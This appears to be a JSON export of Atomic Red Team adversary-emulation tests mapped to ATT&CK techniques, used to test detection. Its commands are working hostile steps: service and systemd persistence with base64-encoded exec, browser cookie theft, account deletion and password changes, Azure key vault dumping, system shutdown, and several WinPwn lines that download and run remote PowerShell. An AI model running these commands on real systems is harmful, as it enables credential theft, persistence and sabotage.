"shortName": "T1543.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Download an executable from github and start it as a service.\nUpon successful execution, powershell will download `AtomicService.exe` from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | binary_path | Name of the service binary, include path. | Path | PathToAtomicsFolder\\T1543.003\\bin\\AtomicService.exe | \n | service_name | Name of the Service | String | AtomicTestService_CMD | "}, "executionSteps": [{"description": "sc.exe create #{service_name} binPath= #{binary_path}\nsc.exe start #{service_name}\n", "successCriteria": null}], "techniqueIds": ["clacwm5vm02uu29mqbhajgzuc", "clacwm2mk010j29mqh6n6htcl"], "tags": []}, {"data": {"name": "Modify Fax service to run PowerShell", "shortName": "T1543.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test will temporarily modify the service Fax by changing the binPath to PowerShell\nand will then revert the binPath change, restoring Fax to its original state.\nUpon successful execution, cmd will modify the binpath for `Fax` to spawn powershell. Powershell will then spawn.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "sc config Fax binPath= \"C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -noexit -c \\\"write-host 'T1543.003 Test'\\\"\"\nsc start Fax\n", "successCriteria": null}], "techniqueIds": ["clacwm5vm02uu29mqbhajgzuc", "clacwm2mk010j29mqh6n6htcl"], "tags": []}, {"data": {"name": "Create Systemd Service file,  Enable the service , Modify and Reload the service.", "shortName": "T1543.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test creates a systemd service unit file and enables it to autostart on boot. Once service is created and enabled, it also modifies this same service file showcasing both Creation and Modification of system process. \n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "cat > /etc/init.d/T1543.002 << EOF\n#!/bin/bash\n### BEGIN INIT INFO\n# Provides : Atomic Test T1543.002\n# Required-Start: $all\n# Required-Stop : \n# Default-Start: 2 3 4 5\n# Default-Stop: \n# Short Description: Atomic Test for Systemd Service Creation\n### END INIT INFO\npython3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBDcmVhdGluZyBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLmNyZWF0aW9uJykK'))\"\nEOF\n\nchmod +x /etc/init.d/T1543.002\nif [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then update-rc.d T1543.002 defaults; elif [ $(cat /etc/os-release | grep -i 'ID=\"centos\"') ]; then chkconfig T1543.002 on ; else echo \"Please run this test on Ubnutu , kali OR centos\" ; fi ;\nsystemctl enable T1543.002\nsystemctl start T1543.002\n\necho \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgYSBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLm1vZGlmaWNhdGlvbicpCg=='))\\\"\" | sudo tee -a /etc/init.d/T1543.002\nsystemctl daemon-reload\nsystemctl restart T1543.002\n", "successCriteria": null}], "techniqueIds": ["clacwm6qe03r629mq2geigdcl"], "tags": []}, {"data": {"name": "Create Systemd Service", "shortName": "T1543.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test creates a Systemd service unit file and enables it as a service.\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | systemd_service_path | Path to systemd service unit file | Path | /etc/systemd/system | \n | systemd_service_file | File name of systemd service unit file | String | art-systemd-service.service | \n | execstoppost_action | ExecStopPost action for Systemd service | String | /bin/touch /tmp/art-systemd-execstoppost-marker | \n | execreload_action | ExecReload action for Systemd service | String | /bin/touch /tmp/art-systemd-execreload-marker | \n | execstart_action | ExecStart action for Systemd service | String | /bin/touch /tmp/art-systemd-execstart-marker | \n | execstop_action | ExecStop action for Systemd service | String | /bin/touch /tmp/art-systemd-execstop-marker | \n | execstartpre_action | ExecStartPre action for Systemd service | String | /bin/touch /tmp/art-systemd-execstartpre-marker | \n | execstartpost_action | ExecStartPost action for Systemd service | String | /bin/touch /tmp/art-systemd-execstartpost-marker | "}, "executionSteps": [{"description": "echo \"[Unit]\" > #{systemd_service_path}/#{systemd_service_file}\necho \"Description=Atomic Red Team Systemd Service\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Service]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"Type=simple\"\necho \"ExecStart=#{execstart_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPre=#{execstartpre_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPost=#{execstartpost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecReload=#{execreload_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStop=#{execstop_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStopPost=#{execstoppost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Install]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"WantedBy=default.target\" >> #{systemd_service_path}/#{systemd_service_file}\nsystemctl daemon-reload\nsystemctl enable #{systemd_service_file}\nsystemctl start #{systemd_service_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm6qe03r629mq2geigdcl", "clacwm2in00wm29mqamz19phr"], "tags": []}, {"data": {"name": "Launch Agent", "shortName": "T1543.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Create a plist and execute it\n\n\n**Supported Platforms:** macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | plist_filename | filename | String | com.atomicredteam.plist | \n | path_malicious_plist | Name of file to store in cron folder | String | $PathToAtomicsFolder/T1543.001/src/atomicredteam_T1543_001.plist | "}, "executionSteps": [{"description": "if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi;\nsudo cp #{path_malicious_plist} ~/Library/LaunchAgents/#{plist_filename}\nsudo launchctl load -w ~/Library/LaunchAgents/#{plist_filename}\n", "successCriteria": null}], "techniqueIds": ["clacwm6o803ot29mqa2oo8fup", "clacwm21c00ig29mq3t5odc69"], "tags": []}, {"data": {"name": "Event Monitor Daemon Persistence", "shortName": "T1543.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test adds persistence via a plist to execute via the macOS Event Monitor Daemon. \n\n\n**Supported Platforms:** macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | script_location | evil plist location | Path | $PathToAtomicsFolder/T1053.004/src/atomicredteam_T1053_004.plist | \n | script_destination | Path where to move the evil plist | Path | /etc/emond.d/rules/atomicredteam_T1053_004.plist | \n | empty_file | Random name of the empty file used to trigger emond service | String | randomflag | "}, "executionSteps": [{"description": "sudo cp #{script_location} #{script_destination}\nsudo touch /private/var/db/emondClients/#{empty_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm6o803ot29mqa2oo8fup"], "tags": []}, {"data": {"name": "Steal Firefox Cookies (Windows)", "shortName": "T1539", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test queries Firefox's cookies.sqlite database to steal the cookie data contained within it, similar to Zloader/Zbot's cookie theft function. \nNote: If Firefox is running, the process will be killed to ensure that the DB file isn't locked. \nSee https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf. \n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | sqlite3_path | Path to sqlite3 | Path | $env:temp\\sqlite-tools-win32-x86-3380200\\sqlite3.exe | \n | output_file | Filepath to output cookies | Path | $env:temp\\T1539FirefoxCookies.txt | "}, "executionSteps": [{"description": "stop-process -name \"firefox\" -force -erroraction silentlycontinue\n$CookieDBLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*\\cookies.sqlite\"\n\"select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite from [moz_cookies];\" | cmd /c #{sqlite3_path} \"$CookieDBLocation\" | out-file -filepath \"#{output_file}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5rp02qf29mqfttw9kro"], "tags": []}, {"data": {"name": "Steal Chrome Cookies (Windows)", "shortName": "T1539", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test queries Chrome's SQLite database to steal the encrypted cookie data, designed to function similarly to Zloader/Zbot's cookie theft function. \nOnce an adversary obtains the encrypted cookie info, they could go on to decrypt the encrypted value, potentially allowing for session theft. \nNote: If Chrome is running, the process will be killed to ensure that the DB file isn't locked. \nSee https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf. \n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | cookie_db | Filepath for Chrome cookies database | String | $env:localappdata\\Google\\Chrome\\User Data\\Default\\Network\\Cookies | \n | sqlite3_path | Path to sqlite3 | Path | $env:temp\\sqlite-tools-win32-x86-3380200\\sqlite3.exe | \n | output_file | Filepath to output cookies | Path | $env:temp\\T1539ChromeCookies.txt | "}, "executionSteps": [{"description": "stop-process -name \"chrome\" -force -erroraction silentlycontinue\n\"select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [Cookies];\" | cmd /c #{sqlite3_path} \"#{cookie_db}\" | out-file -filepath \"#{output_file}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5rp02qf29mqfttw9kro"], "tags": []}, {"data": {"name": "Remove Account From Domain Admin Group", "shortName": "T1531", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test will remove an account from the domain admins group\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | super_user | Account used to run the execution command (must include domain). | String | domain\\super_user | \n | super_pass | super_user account password. | String | password | \n | remove_user | Account to remove from domain admins. | String | remove_user | "}, "executionSteps": [{"description": "$PWord = ConvertTo-SecureString -String #{super_pass} -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList #{super_user}, $PWord\nif((Get-ADUser #{remove_user} -Properties memberof).memberof -like \"CN=Domain Admins*\"){\n  Remove-ADGroupMember -Identity \"Domain Admins\" -Members #{remove_user} -Credential $Credential -Confirm:$False\n} else{\n    write-host \"Error - Make sure #{remove_user} is in the domain admins group\" -foregroundcolor Red\n}\n", "successCriteria": null}], "techniqueIds": ["clacwm6ig03iq29mq8gu1bk3p", "clacwm1az001a29mq8sf9gs4t"], "tags": []}, {"data": {"name": "Delete User - Windows", "shortName": "T1531", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Deletes a user account to prevent access. Upon execution, run the command \"net user\" to verify that the new \"AtomicUser\" account was deleted.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | new_user_password | Password to use if user account must be created first | String | User2DeletePW! | \n | user_account | User account to be deleted. | String | AtomicUser | "}, "executionSteps": [{"description": "net user #{user_account} #{new_user_password} /add\nnet.exe user #{user_account} /delete\n", "successCriteria": null}], "techniqueIds": ["clacwm6ig03iq29mq8gu1bk3p", "clacwm1az001a29mq8sf9gs4t"], "tags": []}, {"data": {"name": "Change User Password - Windows", "shortName": "T1531", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Changes the user password to hinder access attempts. Seen in use by LockerGoga. Upon execution, log into the user account \"AtomicAdministrator\" with\nthe password \"HuHuHUHoHo283283\".\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | user_account | User account whose password will be changed. | String | AtomicAdministrator | \n | new_user_password | Password to use if user account must be created first | String | User2ChangePW! | \n | new_password | New password for the specified account. | String | HuHuHUHoHo283283@dJD | "}, "executionSteps": [{"description": "net user #{user_account} #{new_user_password} /add\nnet.exe user #{user_account} #{new_password}\n", "successCriteria": null}], "techniqueIds": ["clacwm6ig03iq29mq8gu1bk3p", "clacwm1az001a29mq8sf9gs4t"], "tags": []}, {"data": {"name": "Azure - Scan for Anonymous Access to Azure Storage (Powershell)", "shortName": "T1530", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Upon successful execution, this test will test for anonymous access to Azure storage containers by invoking a web request and outputting the results to a file. \nThe corresponding response could then be interpreted to determine whether or not the resource/container exists, as well as other information. \nSee https://ninocrudele.com/the-three-most-effective-and-dangerous-cyberattacks-to-azure-and-countermeasures-part-2-attack-the-azure-storage-service     \n\n\n**Supported Platforms:** iaas:azure\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | base_name | Azure storage account name to test | String | T1530Test2 | \n | output_file | File to output results to | String | $env:temp\\T1530Test2.txt | \n | container_name | Container name to search for (optional) | String | null | \n | blob_name | Blob name to search for (optional) | String | null | "}, "executionSteps": [{"description": "try{$response = invoke-webrequest \"https://#{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}\" -method \"GET\"}\ncatch [system.net.webexception]\n{if($_.Exception.Response -ne $null)\n{$Response = $_.Exception.Response.GetResponseStream()\n$ReadResponse = New-Object System.IO.StreamReader($Response)\n$ReadResponse.BaseStream.Position = 0\n$responseBody = $ReadResponse.ReadToEnd()}\nelse {$responseBody = \"The storage account could not be anonymously accessed.\"}}\n\"Response received for #{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}: $responsebody\" | out-file -filepath #{output_file} -append\n", "successCriteria": null}], "techniqueIds": ["clacwm5yb02x029mqawsedv2n"], "tags": []}, {"data": {"name": "Azure - Enumerate Azure Blobs with MicroBurst", "shortName": "T1530", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Upon successful execution, this test will utilize a wordlist to enumerate the public facing containers and blobs of a specified Azure storage account. \nSee https://www.netspi.com/blog/technical/cloud-penetration-testing/anonymously-enumerating-azure-file-resources/ . \n\n\n**Supported Platforms:** iaas:azure\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | base | Azure blob keyword to enumerate (Example, storage account name) | String | secure | \n | output_file | File to output results to | String | $env:temp\\T1530Test1.txt | \n | wordlist | File path to keywords for search permutations | String | $env:temp\\permutations.txt | "}, "executionSteps": [{"description": "import-module \"$env:temp\\Invoke-EnumerateAzureBlobs.ps1\"\nInvoke-EnumerateAzureBlobs -base #{base} -permutations #{wordlist} -outputfile \"#{output_file}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5yb02x029mqawsedv2n"], "tags": []}, {"data": {"name": "AWS - Scan for Anonymous Access to S3", "shortName": "T1530", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Upon successful execution, this test will test for anonymous access to AWS S3 buckets and dumps all the files to a local folder. \n\n\n**Supported Platforms:** iaas:aws\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | s3_bucket_name | Name of the bucket | String | redatomic-test2 | "}, "executionSteps": [{"description": "aws --no-sign-request s3 cp --recursive s3://#{s3_bucket_name} /tmp/#{s3_bucket_name}\n", "successCriteria": null}], "techniqueIds": ["clacwm5yb02x029mqawsedv2n"], "tags": []}, {"data": {"name": "Shutdown System via `shutdown` - macOS/Linux", "shortName": "T1529", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test shuts down a macOS/Linux system using a halt.\n\n\n**Supported Platforms:** macos, linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | timeout | Time to shutdown (can be minutes or specific time) | String | now | "}, "executionSteps": [{"description": "shutdown -h #{timeout}\n", "successCriteria": null}], "techniqueIds": ["clacwm6vl03wq29mq4aood9ox", "clacwm2ii00wi29mq7336fzux"], "tags": []}, {"data": {"name": "Shutdown System via `poweroff` - Linux", "shortName": "T1529", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test shuts down a Linux system using `poweroff`.\n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "poweroff\n", "successCriteria": null}], "techniqueIds": ["clacwm6vl03wq29mq4aood9ox", "clacwm2ii00wi29mq7336fzux"], "tags": []}, {"data": {"name": "Shutdown System via `halt` - Linux", "shortName": "T1529", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test shuts down a Linux system using `halt`.\n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "halt -p\n", "successCriteria": null}], "techniqueIds": ["clacwm6vl03wq29mq4aood9ox", "clacwm2ii00wi29mq7336fzux"], "tags": []}, {"data": {"name": "Shutdown System - Windows", "shortName": "T1529", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test shuts down a Windows system.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | timeout | Timeout period before shutdown (seconds) | Integer | 1 | "}, "executionSteps": [{"description": "shutdown /s /t #{timeout}\n", "successCriteria": null}], "techniqueIds": ["clacwm6vl03wq29mq4aood9ox", "clacwm2ii00wi29mq7336fzux"], "tags": []}, {"data": {"name": "Restart System via `shutdown` - macOS/Linux", "shortName": "T1529", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test restarts a macOS/Linux system.\n\n\n**Supported Platforms:** macos, linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | timeout | Time to restart (can be minutes or specific time) | String | now | "}, "executionSteps": [{"description": "shutdown -r #{timeout}\n", "successCriteria": null}], "techniqueIds": ["clacwm6vl03wq29mq4aood9ox", "clacwm2ii00wi29mq7336fzux"], "tags": []}, {"data": {"name": "Restart System via `reboot` - macOS/Linux", "shortName": "T1529", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test restarts a macOS/Linux system via `reboot`.\n\n\n**Supported Platforms:** macos, linux\n\n"}, "executionSteps": [{"description": "reboot\n", "successCriteria": null}], "techniqueIds": ["clacwm6vl03wq29mq4aood9ox", "clacwm2ii00wi29mq7336fzux"], "tags": []}, {"data": {"name": "Restart System - Windows", "shortName": "T1529", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test restarts a Windows system.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | timeout | Timeout period before restart (seconds) | Integer | 1 | "}, "executionSteps": [{"description": "shutdown /r /t #{timeout}\n", "successCriteria": null}], "techniqueIds": ["clacwm6vl03wq29mq4aood9ox", "clacwm2ii00wi29mq7336fzux"], "tags": []}, {"data": {"name": "Reboot System via `poweroff` - Linux", "shortName": "T1529", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test restarts a Linux system using `poweroff`.\n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "poweroff --reboot\n", "successCriteria": null}], "techniqueIds": ["clacwm6vl03wq29mq4aood9ox", "clacwm2ii00wi29mq7336fzux"], "tags": []}, {"data": {"name": "Reboot System via `halt` - Linux", "shortName": "T1529", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test restarts a Linux system using `halt`.\n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "halt --reboot\n", "successCriteria": null}], "techniqueIds": ["clacwm6vl03wq29mq4aood9ox", "clacwm2ii00wi29mq7336fzux"], "tags": []}, {"data": {"name": "Logoff System - Windows", "shortName": "T1529", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test performs a Windows system logoff as seen in [dcrat backdoor capabilities](https://www.mandiant.com/resources/analyzing-dark-crystal-rat-backdoor)\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "shutdown /l \n", "successCriteria": null}], "techniqueIds": ["clacwm6vl03wq29mq4aood9ox"], "tags": []}, {"data": {"name": "Azure - Dump All Azure Key Vaults with Microburst", "shortName": "T1528", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Upon successful execution of this test, the names, locations, and contents of key vaults within an Azure account will be output to a file.\nSee - https://www.netspi.com/blog/technical/cloud-penetration-testing/a-beginners-guide-to-gathering-azure-passwords/\n\n**Supported Platforms:** iaas:azure\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | username | Azure AD username | String | null | \n | password | Azure AD password | String | T1082Az | \n | output_file | File to dump results to | String | $env:temp\\T1528Test1.txt | \n | subscription_id | Azure subscription id to search | String | null | "}, "executionSteps": [{"description": "import-module \"$env:temp\\Get-AzurePasswords.ps1\"\n$Password = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Password\nConnect-AzureRmAccount -Credential $Credential\nGet-AzurePasswords -subscription '#{subscription_id}' > #{output_file}\ncat #{output_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm6du03cy29mq50e2c8wb"], "tags": []}, {"data": {"name": "Azure - Dump Subscription Data with MicroBurst", "shortName": "T1526", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Upon successful execution, this test will enumerate all resources that are contained within a valid Azure subscription. \nThe resources enumerated will display on screen, as well as several csv files and folders will be output to a specified directory, listing what resources were discovered by the script. \nSee https://dev.to/cheahengsoon/enumerating-subscription-information-with-microburst-35a1\n\n\n**Supported Platforms:** iaas:azure\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | username | Azure AD username | String | null | \n | password | Azure AD password | String | T1082Az | \n | output_directory | Directory to output results to | String | $env:temp\\T1526Test1 | \n | subscription_name | Azure subscription name to scan | String | null | "}, "executionSteps": [{"description": "import-module \"$env:temp\\Get-AzDomainInfo.ps1\"\n$Password = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Password\nConnect-AzAccount -Credential $Credential | out-null\nGet-AzDomainInfo -folder #{output_directory} -subscription \"#{subscription_name}\" -verbose\n", "successCriteria": null}], "techniqueIds": ["clacwm6qn03ri29mq1rs582p3"], "tags": []}, {"data": {"name": "Security Software Discovery - Sysmon Service", "shortName": "T1518.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Discovery of an installed Sysinternals Sysmon service using driver altitude (even if the name is changed).\n\nwhen sucessfully executed, the test is going to display sysmon driver instance if it is installed.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "fltmc.exe | findstr.exe 385201\n", "successCriteria": null}], "techniqueIds": ["clacwm6n703nr29mqexcad6jk", "clacwm2ej00t229mq581z4ccv"], "tags": []}, {"data": {"name": "Security Software Discovery - ps (macOS)", "shortName": "T1518.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Methods to identify Security Software on an endpoint\nwhen sucessfully executed, command shell  is going to display AV/Security software it is running.\n\n\n**Supported Platforms:** macos\n\n"}, "executionSteps": [{"description": "ps aux | egrep 'Little\\ Snitch|CbOsxSensorService|falcond|nessusd|santad|CbDefense|td-agent|packetbeat|filebeat|auditbeat|osqueryd|BlockBlock|LuLu'\n", "successCriteria": null}], "techniqueIds": ["clacwm6n703nr29mqexcad6jk", "clacwm2ej00t229mq581z4ccv"], "tags": []}, {"data": {"name": "Security Software Discovery - ps (Linux)", "shortName": "T1518.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Methods to identify Security Software on an endpoint\nwhen sucessfully executed, command shell  is going to display AV/Security software it is running.\n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "ps aux | egrep 'falcond|nessusd|cbagentd|td-agent|packetbeat|filebeat|auditbeat|osqueryd'\n", "successCriteria": null}], "techniqueIds": ["clacwm6n703nr29mqexcad6jk", "clacwm2ej00t229mq581z4ccv"], "tags": []}, {"data": {"name": "Security Software Discovery - powershell", "shortName": "T1518.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Methods to identify Security Software on an endpoint\n\nwhen sucessfully executed, powershell is going to processes related AV products if they are running.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "get-process | ?{$_.Description -like \"*virus*\"}\nget-process | ?{$_.Description -like \"*carbonblack*\"}\nget-process | ?{$_.Description -like \"*defender*\"}\nget-process | ?{$_.Description -like \"*cylance*\"}\n", "successCriteria": null}], "techniqueIds": ["clacwm6n703nr29mqexcad6jk", "clacwm2ej00t229mq581z4ccv"], "tags": []}, {"data": {"name": "Security Software Discovery - AV Discovery via WMI", "shortName": "T1518.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Discovery of installed antivirus products via a WMI query.\n\nwhen sucessfully executed, the test is going to display installed AV software.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "wmic.exe /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List", "successCriteria": null}], "techniqueIds": ["clacwm6n703nr29mqexcad6jk", "clacwm2ej00t229mq581z4ccv"], "tags": []}, {"data": {"name": "Security Software Discovery", "shortName": "T1518.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Methods to identify Security Software on an endpoint\n\nwhen sucessfully executed, the test is going to display running processes, firewall configuration on network profiles\nand specific security software.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "netsh.exe advfirewall  show allprofiles\ntasklist.exe\ntasklist.exe | findstr /i virus\ntasklist.exe | findstr /i cb\ntasklist.exe | findstr /i defender\ntasklist.exe | findstr /i cylance\n", "successCriteria": null}], "techniqueIds": ["clacwm6n703nr29mqexcad6jk", "clacwm2ej00t229mq581z4ccv"], "tags": []}, {"data": {"name": "WinPwn - powerSQL", "shortName": "T1518", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Start PowerUpSQL Checks using powerSQL function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npowerSQL -noninteractive -consoleoutput", "successCriteria": null}], "techniqueIds": ["clacwm6qw03rt29mq8mobf153"], "tags": []}, {"data": {"name": "WinPwn - Dotnetsearch", "shortName": "T1518", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Search for any .NET binary file in a share using the Dotnetsearch function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nDotnetsearch -noninteractive -consoleoutput", "successCriteria": null}], "techniqueIds": ["clacwm6qw03rt29mq8mobf153"], "tags": []}, {"data": {"name": "WinPwn - DotNet", "shortName": "T1518", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Search for .NET Service-Binaries on this system via winpwn dotnet function of WinPwn.\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ndotnet -consoleoutput -noninteractive", "successCriteria": null}], "techniqueIds": ["clacwm6qw03rt29mq8mobf153"], "tags": []}, {"data": {"name": "Find and Display Safari Browser Version", "shortName": "T1518", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Adversaries may attempt to get a listing of non-security related software that is installed on the system. Adversaries may use the information from Software Discovery during automated discovery to shape follow-on behaviors\n\n\n**Supported Platforms:** macos\n\n"}, "executionSteps": [{"description": "/usr/libexec/PlistBuddy -c \"print :CFBundleShortVersionString\" /Applications/Safari.app/Contents/Info.plist\n/usr/libexec/PlistBuddy -c \"print :CFBundleVersion\" /Applications/Safari.app/Contents/Info.plist\n", "successCriteria": null}], "techniqueIds": ["clacwm6qw03rt29mq8mobf153", "clacwm2g500um29mq00elhy2w"], "tags": []}, {"data": {"name": "Find and Display Internet Explorer Browser Version", "shortName": "T1518", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Query the registry to determine the version of internet explorer installed on the system.\nUpon execution, version information about internet explorer will be displayed.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg query \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Internet Explorer\" /v svcVersion\n", "successCriteria": null}], "techniqueIds": ["clacwm6qw03rt29mq8mobf153", "clacwm2g500um29mq00elhy2w"], "tags": []}, {"data": {"name": "Applications Installed", "shortName": "T1518", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Query the registry to determine software and versions installed on the system. Upon execution a table of\nsoftware name and version information will be displayed.\n\n\n**Supported Platforms:** 